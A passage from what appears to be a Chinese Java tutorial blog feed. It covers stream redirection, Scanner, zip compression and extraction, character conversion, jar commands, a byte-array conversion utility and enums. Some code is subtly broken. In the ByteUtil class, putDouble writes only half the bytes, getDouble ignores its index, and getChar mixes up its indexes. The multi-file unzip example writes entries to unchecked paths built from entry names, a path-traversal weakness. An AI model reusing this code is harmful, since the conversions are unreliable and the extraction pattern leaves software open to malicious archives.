        System.out.println(&quot;这些内容在文件中才能看到哦！&quot;);
    &#125;
&#125;
</code></pre>
<p>【运行结果】：</p>
<p>eclipse的控制台输出的是hello。然后当我们查看d盘下面的hello.txt文件的时候，会在里面看到：这些内容在文件中才能看到哦！</p>
<pre><code>import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;
 
/**
 * System.err重定向 这个例子也提示我们可以使用这种方法保存错误信息
 * */
public class systemErr&#123;
    public static void main(String[] args)&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        System.err.println(&quot;这些在控制台输出&quot;);
        try&#123;
            System.setErr(new PrintStream(new FileOutputStream(file)));
        &#125;catch(FileNotFoundException e)&#123;
            e.printStackTrace();
        &#125;
        System.err.println(&quot;这些在文件中才能看到哦！&quot;);
    &#125;
&#125;
</code></pre>
<p>【运行结果】：</p>
<p>你会在eclipse的控制台看到红色的输出：“这些在控制台输出”，然后在d盘下面的hello.txt中会看到：这些在文件中才能看到哦！</p>
<pre><code>import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
 
/**
 * System.in重定向
 * */
public class systemIn&#123;
    public static void main(String[] args)&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        if(!file.exists())&#123;
            return;
        &#125;else&#123;
            try&#123;
                System.setIn(new FileInputStream(file));
            &#125;catch(FileNotFoundException e)&#123;
                e.printStackTrace();
            &#125;
            byte[] bytes = new byte[1024];
            int len = 0;
            try&#123;
                len = System.in.read(bytes);
            &#125;catch(IOException e)&#123;
                e.printStackTrace();
            &#125;
            System.out.println(&quot;读入的内容为：&quot; + new String(bytes, 0, len));
        &#125;
    &#125;
&#125;
</code></pre>
<p>【运行结果】：</p>
<p>前提是我的d盘下面的hello.txt中的内容是：“这些文件中的内容哦！”，然后运行程序，输出的结果为：读入的内容为：这些文件中的内容哦！</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之Scanner</title>
    <url>/blog/plang/java/io/scanner/</url>
    <content><![CDATA[<p>其实我们比较常用的是采用Scanner类来进行数据输入</p>
<pre><code>import java.util.Scanner;
 
/**
 * Scanner的小例子，从键盘读数据
 * */
public class ScannerDemo&#123;
    public static void main(String[] args)&#123;
        Scanner sca = new Scanner(System.in);
        // 读一个整数
        int temp = sca.nextInt();
        System.out.println(temp);
        //读取浮点数
        float flo=sca.nextFloat();
        System.out.println(flo);
        //读取字符
        //...等等的，都是一些太基础的，就不师范了。
    &#125;
&#125;
</code></pre>
<p>其实Scanner可以接受任何的输入流</p>
<pre><code>import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;
 
/**
 * Scanner的小例子，从文件中读内容
 * */
public class ScannerDemo&#123;
    public static void main(String[] args)&#123;
 
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        Scanner sca = null;
        try&#123;
            sca = new Scanner(file);
        &#125;catch(FileNotFoundException e)&#123;
            e.printStackTrace();
        &#125;
        String str = sca.next();
        System.out.println(&quot;从文件中读取的内容是：&quot; + str);
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之ZipOutputString&amp;ZipInputStream</title>
    <url>/blog/plang/java/io/zipio/</url>
    <content><![CDATA[<h2 id="文件压缩-ZipOutputStream类"><a href="#文件压缩-ZipOutputStream类" class="headerlink" title="文件压缩 ZipOutputStream类"></a>文件压缩 ZipOutputStream类</h2><p>先举一个压缩单个文件的例子吧：</p>
<pre><code>import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
 
public class ZipOutputStreamDemo1&#123;
    public static void main(String[] args) throws IOException&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        File zipFile = new File(&quot;d:&quot; + File.separator + &quot;hello.zip&quot;);
        InputStream input = new FileInputStream(file);
        ZipOutputStream zipOut = new ZipOutputStream(new FileOutputStream(
                zipFile));
        zipOut.putNextEntry(new ZipEntry(file.getName()));
        // 设置注释
        zipOut.setComment(&quot;hello&quot;);
        int temp = 0;
        while((temp = input.read()) != -1)&#123;
            zipOut.write(temp);
        &#125;
        input.close();
        zipOut.close();
    &#125;
&#125;
</code></pre>
<p>下面的们来看看如何压缩多个文件。</p>
<pre><code>import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
 
/**
 * 一次性压缩多个文件
 * */
public class ZipOutputStreamDemo2&#123;
    public static void main(String[] args) throws IOException&#123;
        // 要被压缩的文件夹
        File file = new File(&quot;d:&quot; + File.separator + &quot;temp&quot;);
        File zipFile = new File(&quot;d:&quot; + File.separator + &quot;zipFile.zip&quot;);
        InputStream input = null;
        ZipOutputStream zipOut = new ZipOutputStream(new FileOutputStream(
                zipFile));
        zipOut.setComment(&quot;hello&quot;);
        if(file.isDirectory())&#123;
            File[] files = file.listFiles();
            for(int i = 0; i &lt; files.length; ++i)&#123;
                input = new FileInputStream(files[i]);
                zipOut.putNextEntry(new ZipEntry(file.getName()
                        + File.separator + files[i].getName()));
                int temp = 0;
                while((temp = input.read()) != -1)&#123;
                    zipOut.write(temp);
                &#125;
                input.close();
            &#125;
        &#125;
        zipOut.close();
    &#125;
&#125;
</code></pre>
<h2 id="解压ZipFile类"><a href="#解压ZipFile类" class="headerlink" title="解压ZipFile类"></a>解压ZipFile类</h2><p>java中的每一个压缩文件都是可以使用ZipFile来进行表示的</p>
<pre><code>import java.io.File;
import java.io.IOException;
import java.util.zip.ZipFile;
 
/**
 * ZipFile演示
 * */
public class ZipFileDemo&#123;
    public static void main(String[] args) throws IOException&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.zip&quot;);
        ZipFile zipFile = new ZipFile(file);
        System.out.println(&quot;压缩文件的名称为：&quot; + zipFile.getName());
    &#125;
&#125;
</code></pre>
<p>解压单个压缩文件</p>
<pre><code>import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
 
/**
 * 解压缩文件（压缩文件中只有一个文件的情况）
 * */
public class ZipFileDemo2&#123;
    public static void main(String[] args) throws IOException&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.zip&quot;);
        File outFile = new File(&quot;d:&quot; + File.separator + &quot;unZipFile.txt&quot;);
        ZipFile zipFile = new ZipFile(file);
        ZipEntry entry = zipFile.getEntry(&quot;hello.txt&quot;);
        InputStream input = zipFile.getInputStream(entry);
        OutputStream output = new FileOutputStream(outFile);
        int temp = 0;
        while((temp = input.read()) != -1)&#123;
            output.write(temp);
        &#125;
        input.close();
        output.close();
    &#125;
&#125;
</code></pre>
<h2 id="解压多个文件ZipInputStream类"><a href="#解压多个文件ZipInputStream类" class="headerlink" title="解压多个文件ZipInputStream类"></a>解压多个文件ZipInputStream类</h2><p>当我们需要解压缩多个文件的时候，ZipEntry就无法使用了，如果想操作更加复杂的压缩文件，我们就必须使用ZipInputStream类</p>
<pre><code>import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipInputStream;
 
/**
 * 解压缩一个压缩文件中包含多个文件的情况
 * */
public class ZipFileDemo3&#123;
    public static void main(String[] args) throws IOException&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;zipFile.zip&quot;);
        File outFile = null;
        ZipFile zipFile = new ZipFile(file);
        ZipInputStream zipInput = new ZipInputStream(new FileInputStream(file));
        ZipEntry entry = null;
        InputStream input = null;
        OutputStream output = null;
        while((entry = zipInput.getNextEntry()) != null)&#123;
            System.out.println(&quot;解压缩&quot; + entry.getName() + &quot;文件&quot;);
            outFile = new File(&quot;d:&quot; + File.separator + entry.getName());
            if(!outFile.getParentFile().exists())&#123;
                outFile.getParentFile().mkdir();
            &#125;
            if(!outFile.exists())&#123;
                outFile.createNewFile();
            &#125;
            input = zipFile.getInputStream(entry);
            output = new FileOutputStream(outFile);
            int temp = 0;
            while((temp = input.read()) != -1)&#123;
                output.write(temp);
            &#125;
            input.close();
            output.close();
        &#125;
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA字符大小写转换</title>
    <url>/blog/plang/java/base/charuplower/</url>
    <content><![CDATA[<p>主要思想：大小写对应字母之差相同，因为在ASSIC表中大小写字母是两段连续的数字。这个差可以用&#39;a&#39;</p>
<ul>
<li>&#39;A&#39;表示。</li>
</ul>
<p>转小写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static char toLowerCase(char c) &#123;</span><br><span class="line">    // BEGIN android-changed</span><br><span class="line">    return (char) toLowerCase((int) c);</span><br><span class="line">    // END android-changed</span><br><span class="line">&#125;</span><br><span class="line">public static int toLowerCase(int codePoint) &#123;</span><br><span class="line">    // BEGIN android-changed</span><br><span class="line">    // Optimized case for ASCII</span><br><span class="line">    if (&#x27;A&#x27; &lt;= codePoint &amp;&amp; codePoint &lt;= &#x27;Z&#x27;) &#123;</span><br><span class="line">        return (char) (codePoint + (&#x27;a&#x27; - &#x27;A&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">    if (codePoint &lt; 192) &#123;</span><br><span class="line">        return codePoint;</span><br><span class="line">    &#125;</span><br><span class="line">    return UCharacter.toLowerCase(codePoint);</span><br><span class="line">    // END android-changed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转大写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static char toUpperCase(char c) &#123;</span><br><span class="line">    // BEGIN android-changed</span><br><span class="line">    return (char) toUpperCase((int) c);</span><br><span class="line">    // END android-changed</span><br><span class="line">&#125;</span><br><span class="line">public static int toUpperCase(int codePoint) &#123;</span><br><span class="line">    // BEGIN android-changed</span><br><span class="line">    // Optimized case for ASCII</span><br><span class="line">    if (&#x27;a&#x27; &lt;= codePoint &amp;&amp; codePoint &lt;= &#x27;z&#x27;) &#123;</span><br><span class="line">        return (char) (codePoint - (&#x27;a&#x27; - &#x27;A&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">    if (codePoint &lt; 181) &#123;</span><br><span class="line">        return codePoint;</span><br><span class="line">    &#125;</span><br><span class="line">    return UCharacter.toUpperCase(codePoint);</span><br><span class="line">    // END android-changed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>Java编译、运行、打包命令</title>
    <url>/blog/plang/java/base/command/</url>
    <content><![CDATA[<p>编译：javac -d . HelloWorld.java</p>
<p>运行：Java 包名.类名</p>
<p>打包：jar cvf myJar.jar com</p>
<p>打运行包：jar cvfm myJar.jar 1.MF com</p>
<p>运行jar:  java -jar myJar.jar</p>
<p>使用指定jar包编译</p>
<p>一起打包运行，设置Class-Path</p>
<p>com是包的根，一般包结构都是com.iteedu.xxx结构。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>java中byte数组与int，long，short间的转换</title>
    <url>/blog/plang/java/base/bytetonum/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.util;</span><br><span class="line"></span><br><span class="line">public class ByteUtil &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 转换short为byte</span><br><span class="line">     * </span><br><span class="line">     * @param b</span><br><span class="line">     * @param s</span><br><span class="line">     *            需要转换的short</span><br><span class="line">     * @param index</span><br><span class="line">     */</span><br><span class="line">    public static void putShort(byte b[], short s, int index) &#123;</span><br><span class="line">        b[index + 1] = (byte) (s &gt;&gt; 8);</span><br><span class="line">        b[index + 0] = (byte) (s &gt;&gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 通过byte数组取到short</span><br><span class="line">     * </span><br><span class="line">     * @param b</span><br><span class="line">     * @param index</span><br><span class="line">     *            第几位开始取</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static short getShort(byte[] b, int index) &#123;</span><br><span class="line">        return (short) (((b[index + 1] &lt;&lt; 8) | b[index + 0] &amp; 0xff));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 转换int为byte数组</span><br><span class="line">     * </span><br><span class="line">     * @param bb</span><br><span class="line">     * @param x</span><br><span class="line">     * @param index</span><br><span class="line">     */</span><br><span class="line">    public static void putInt(byte[] bb, int x, int index) &#123;</span><br><span class="line">        bb[index + 3] = (byte) (x &gt;&gt; 24);</span><br><span class="line">        bb[index + 2] = (byte) (x &gt;&gt; 16);</span><br><span class="line">        bb[index + 1] = (byte) (x &gt;&gt; 8);</span><br><span class="line">        bb[index + 0] = (byte) (x &gt;&gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 通过byte数组取到int</span><br><span class="line">     * </span><br><span class="line">     * @param bb</span><br><span class="line">     * @param index</span><br><span class="line">     *            第几位开始</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static int getInt(byte[] bb, int index) &#123;</span><br><span class="line">        return (int) ((((bb[index + 3] &amp; 0xff) &lt;&lt; 24)</span><br><span class="line">                | ((bb[index + 2] &amp; 0xff) &lt;&lt; 16)</span><br><span class="line">                | ((bb[index + 1] &amp; 0xff) &lt;&lt; 8) | ((bb[index + 0] &amp; 0xff) &lt;&lt; 0)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 转换long型为byte数组</span><br><span class="line">     * </span><br><span class="line">     * @param bb</span><br><span class="line">     * @param x</span><br><span class="line">     * @param index</span><br><span class="line">     */</span><br><span class="line">    public static void putLong(byte[] bb, long x, int index) &#123;</span><br><span class="line">        bb[index + 7] = (byte) (x &gt;&gt; 56);</span><br><span class="line">        bb[index + 6] = (byte) (x &gt;&gt; 48);</span><br><span class="line">        bb[index + 5] = (byte) (x &gt;&gt; 40);</span><br><span class="line">        bb[index + 4] = (byte) (x &gt;&gt; 32);</span><br><span class="line">        bb[index + 3] = (byte) (x &gt;&gt; 24);</span><br><span class="line">        bb[index + 2] = (byte) (x &gt;&gt; 16);</span><br><span class="line">        bb[index + 1] = (byte) (x &gt;&gt; 8);</span><br><span class="line">        bb[index + 0] = (byte) (x &gt;&gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 通过byte数组取到long</span><br><span class="line">     * </span><br><span class="line">     * @param bb</span><br><span class="line">     * @param index</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static long getLong(byte[] bb, int index) &#123;</span><br><span class="line">        return ((((long) bb[index + 7] &amp; 0xff) &lt;&lt; 56)</span><br><span class="line">                | (((long) bb[index + 6] &amp; 0xff) &lt;&lt; 48)</span><br><span class="line">                | (((long) bb[index + 5] &amp; 0xff) &lt;&lt; 40)</span><br><span class="line">                | (((long) bb[index + 4] &amp; 0xff) &lt;&lt; 32)</span><br><span class="line">                | (((long) bb[index + 3] &amp; 0xff) &lt;&lt; 24)</span><br><span class="line">                | (((long) bb[index + 2] &amp; 0xff) &lt;&lt; 16)</span><br><span class="line">                | (((long) bb[index + 1] &amp; 0xff) &lt;&lt; 8) | (((long) bb[index + 0] &amp; 0xff) &lt;&lt; 0));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 字符到字节转换</span><br><span class="line">     * </span><br><span class="line">     * @param ch</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static void putChar(byte[] bb, char ch, int index) &#123;</span><br><span class="line">        int temp = (int) ch;</span><br><span class="line">        // byte[] b = new byte[2];</span><br><span class="line">        for (int i = 0; i &lt; 2; i ++ ) &#123;</span><br><span class="line">            bb[index + i] = new Integer(temp &amp; 0xff).byteValue(); // 将最高位保存在最低位</span><br><span class="line">            temp = temp &gt;&gt; 8; // 向右移8位</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 字节到字符转换</span><br><span class="line">     * </span><br><span class="line">     * @param b</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static char getChar(byte[] b, int index) &#123;</span><br><span class="line">        int s = 0;</span><br><span class="line">        if (b[index + 1] &gt; 0)</span><br><span class="line">            s += b[index + 1];</span><br><span class="line">        else</span><br><span class="line">            s += 256 + b[index + 0];</span><br><span class="line">        s *= 256;</span><br><span class="line">        if (b[index + 0] &gt; 0)</span><br><span class="line">            s += b[index + 1];</span><br><span class="line">        else</span><br><span class="line">            s += 256 + b[index + 0];</span><br><span class="line">        char ch = (char) s;</span><br><span class="line">        return ch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * float转换byte</span><br><span class="line">     * </span><br><span class="line">     * @param bb</span><br><span class="line">     * @param x</span><br><span class="line">     * @param index</span><br><span class="line">     */</span><br><span class="line">    public static void putFloat(byte[] bb, float x, int index) &#123;</span><br><span class="line">        // byte[] b = new byte[4];</span><br><span class="line">        int l = Float.floatToIntBits(x);</span><br><span class="line">        for (int i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            bb[index + i] = new Integer(l).byteValue();</span><br><span class="line">            l = l &gt;&gt; 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 通过byte数组取得float</span><br><span class="line">     * </span><br><span class="line">     * @param bb</span><br><span class="line">     * @param index</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static float getFloat(byte[] b, int index) &#123;</span><br><span class="line">        int l;</span><br><span class="line">        l = b[index + 0];</span><br><span class="line">        l &amp;= 0xff;</span><br><span class="line">        l |= ((long) b[index + 1] &lt;&lt; 8);</span><br><span class="line">        l &amp;= 0xffff;</span><br><span class="line">        l |= ((long) b[index + 2] &lt;&lt; 16);</span><br><span class="line">        l &amp;= 0xffffff;</span><br><span class="line">        l |= ((long) b[index + 3] &lt;&lt; 24);</span><br><span class="line">        return Float.intBitsToFloat(l);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * double转换byte</span><br><span class="line">     * </span><br><span class="line">     * @param bb</span><br><span class="line">     * @param x</span><br><span class="line">     * @param index</span><br><span class="line">     */</span><br><span class="line">    public static void putDouble(byte[] bb, double x, int index) &#123;</span><br><span class="line">        // byte[] b = new byte[8];</span><br><span class="line">        long l = Double.doubleToLongBits(x);</span><br><span class="line">        for (int i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            bb[index + i] = new Long(l).byteValue();</span><br><span class="line">            l = l &gt;&gt; 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 通过byte数组取得float</span><br><span class="line">     * </span><br><span class="line">     * @param bb</span><br><span class="line">     * @param index</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static double getDouble(byte[] b, int index) &#123;</span><br><span class="line">        long l;</span><br><span class="line">        l = b[0];</span><br><span class="line">        l &amp;= 0xff;</span><br><span class="line">        l |= ((long) b[1] &lt;&lt; 8);</span><br><span class="line">        l &amp;= 0xffff;</span><br><span class="line">        l |= ((long) b[2] &lt;&lt; 16);</span><br><span class="line">        l &amp;= 0xffffff;</span><br><span class="line">        l |= ((long) b[3] &lt;&lt; 24);</span><br><span class="line">        l &amp;= 0xffffffffl;</span><br><span class="line">        l |= ((long) b[4] &lt;&lt; 32);</span><br><span class="line">        l &amp;= 0xffffffffffl;</span><br><span class="line">        l |= ((long) b[5] &lt;&lt; 40);</span><br><span class="line">        l &amp;= 0xffffffffffffl;</span><br><span class="line">        l |= ((long) b[6] &lt;&lt; 48);</span><br><span class="line">        l &amp;= 0xffffffffffffffl;</span><br><span class="line">        l |= ((long) b[7] &lt;&lt; 56);</span><br><span class="line">        return Double.longBitsToDouble(l);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA digit(Char,Int)把一个字符转换为一个数字</title>
    <url>/blog/plang/java/base/digit/</url>
    <content><![CDATA[<p>进制radix主要用来排错，因为转换的数为能大于radix。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static int digit(int codePoint, int radix) &#123;</span><br><span class="line">    // BEGIN android-changed</span><br><span class="line">    if (radix &lt; MIN_RADIX || radix &gt; MAX_RADIX) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (codePoint &lt; 128) &#123;</span><br><span class="line">        // Optimized for ASCII</span><br><span class="line">        int result = -1;</span><br><span class="line">        if (&#x27;0&#x27; &lt;= codePoint &amp;&amp; codePoint &lt;= &#x27;9&#x27;) &#123;</span><br><span class="line">            result = codePoint - &#x27;0&#x27;;</span><br><span class="line">        &#125; else if (&#x27;a&#x27; &lt;= codePoint &amp;&amp; codePoint &lt;= &#x27;z&#x27;) &#123;</span><br><span class="line">            result = 10 + (codePoint - &#x27;a&#x27;);</span><br><span class="line">        &#125; else if (&#x27;A&#x27; &lt;= codePoint &amp;&amp; codePoint &lt;= &#x27;Z&#x27;) &#123;</span><br><span class="line">            result = 10 + (codePoint - &#x27;A&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        return result &lt; radix ? result : -1;</span><br><span class="line">    &#125;</span><br><span class="line">    return UCharacter.digit(codePoint, radix);</span><br><span class="line">    // END android-changed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中的Enum用法介绍</title>
    <url>/blog/plang/java/base/enum/</url>
    <content><![CDATA[<ol>
<li>关于Java Enum:</li>
</ol>
<hr>
<p>学过C&#x2F;C++等语言的人，应该都对Enum类型略知一二。Enum一般用来表示一组相同类型的常量。如性别、日期、月份、颜色等。对这些属性用常量的好处是显而易见的，不仅可以保证单例，且比较时候可以用”&#x3D;&#x3D;”来替换equals。是一种好的习惯。JDK1.5之前没有Enum这个类型，那时候一般用接口常量来替代。有了JavaEnum之后，可以更贴近的表示这种常量。</p>
<ol start="2">
<li>如何使用Java Enum</li>
</ol>
<hr>
<p>简单的用法：JavaEnum简单的用法一般用于代表一组常用常量，可用来代表一类相同类型的常量值。如：</p>
<p>性别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public enum SexEnum &#123;</span><br><span class="line">  male, female;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>颜色：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public enum Color &#123;</span><br><span class="line">  RED, BLUE,GREEN,BLACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>枚举对象里面的值都必须是唯一的。</p>
<p>可以通过Enum类型名直接引用该常量，如SexEnum.male,Color.RED.</p>
<p>复杂用法：Java为枚举类型提供了一些内置的方法，同事枚举常量还可以有自己的方法。可以很方便的遍历枚举对象，看个下面的例子：</p>
<h3 id="1-代码一-WeekDay-java"><a href="#1-代码一-WeekDay-java" class="headerlink" title="1. 代码一 WeekDay.java:"></a>1. 代码一 WeekDay.java:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public enum WeekDay &#123;</span><br><span class="line"></span><br><span class="line">    Mon(&quot;Monday&quot;), Tue(&quot;Tuesday&quot;), Wed(&quot;Wednesday&quot;), Thu(&quot;Thursday&quot;), Fri(</span><br><span class="line"></span><br><span class="line">    &quot;Friday&quot;), Sat(&quot;Saturday&quot;), Sun(&quot;Sunday&quot;);</span><br><span class="line"></span><br><span class="line">    private final String day;</span><br><span class="line"></span><br><span class="line">    private WeekDay(String day) &#123;</span><br><span class="line"></span><br><span class="line">        this.day = day;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void printDay(int i) &#123;</span><br><span class="line"></span><br><span class="line">        switch (i) &#123;</span><br><span class="line"></span><br><span class="line">            case 1:</span><br><span class="line">                System.out.println(WeekDay.Mon);</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            case 2:</span><br><span class="line">                System.out.println(WeekDay.Tue);</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            case 3:</span><br><span class="line">                System.out.println(WeekDay.Wed);</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            case 4:</span><br><span class="line">                System.out.println(WeekDay.Thu);</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            case 5:</span><br><span class="line">                System.out.println(WeekDay.Fri);</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            case 6:</span><br><span class="line">                System.out.println(WeekDay.Sat);</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            case 7:</span><br><span class="line">                System.out.println(WeekDay.Sun);</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            default:</span><br><span class="line">                System.out.println(&quot;wrong number!&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getDay() &#123;</span><br><span class="line"></span><br><span class="line">        return day;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-代码二-WeekDayTest-java"><a href="#2-代码二-WeekDayTest-java" class="headerlink" title="2. 代码二 WeekDayTest.java:"></a>2. 代码二 WeekDayTest.java:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class WeekDayTest &#123;</span><br><span class="line"></span><br><span class="line">  public static void main(String args[]) &#123; </span><br><span class="line"></span><br><span class="line">     for (WeekDay day : WeekDay.values()) &#123;</span><br><span class="line"></span><br><span class="line">         System.out.println(day + &quot;====&gt;&quot; + day.getDay());</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      WeekDay.printDay(5);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<p>Mon&#x3D;&#x3D;&#x3D;&#x3D;&gt;Monday</p>
<p>Tue&#x3D;&#x3D;&#x3D;&#x3D;&gt;Tuesday</p>
<p>Wed&#x3D;&#x3D;&#x3D;&#x3D;&gt;Wednesday</p>
<p>Thu&#x3D;&#x3D;&#x3D;&#x3D;&gt;Thursday</p>
<p>Fri&#x3D;&#x3D;&#x3D;&#x3D;&gt;Friday</p>
<p>Sat&#x3D;&#x3D;&#x3D;&#x3D;&gt;Saturday</p>
<p>Sun&#x3D;&#x3D;&#x3D;&#x3D;&gt;Sunday</p>
<ol start="3">
<li>Java Enum原理</li>
</ol>
<hr>
<p>Java<br>Enum类型的语法结构尽管和java类的语法不一样，应该说差别比较大。但是经过编译器编译之后产生的是一个class文件。该class文件经过反编译可以看到实际上是生成了一个类，该类继承了java.lang.Enum.</p>
<p>WeekDay经过反编译(javap WeekDay命令)之后得到的内容如下(去掉了汇编代码)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public final class WeekDay extends java.lang.Enum&#123;</span><br><span class="line"></span><br><span class="line">    public static final WeekDay Mon;</span><br><span class="line"></span><br><span class="line">    public static final WeekDay Tue;</span><br><span class="line"></span><br><span class="line">    public static final WeekDay Wed;</span><br><span class="line"></span><br><span class="line">    public static final WeekDay Thu;</span><br><span class="line"></span><br><span class="line">    public static final WeekDay Fri;</span><br><span class="line"></span><br><span class="line">    public static final WeekDay Sat;</span><br><span class="line"></span><br><span class="line">    public static final WeekDay Sun;</span><br><span class="line"></span><br><span class="line">    static &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    public static void printDay(int);</span><br><span class="line"></span><br><span class="line">    public java.lang.String getDay();</span><br><span class="line"></span><br><span class="line">    public static WeekDay[] values();</span><br><span class="line"></span><br><span class="line">    public static WeekDay valueOf(java.lang.String);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以实际上Enum类型就是以Java类来实现的，没有什么新的特点，只不过java编译器帮我们做了语法的解析和编译。完全也可以自己实现。但是既然有这样方便一个东西，当然会去用了。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
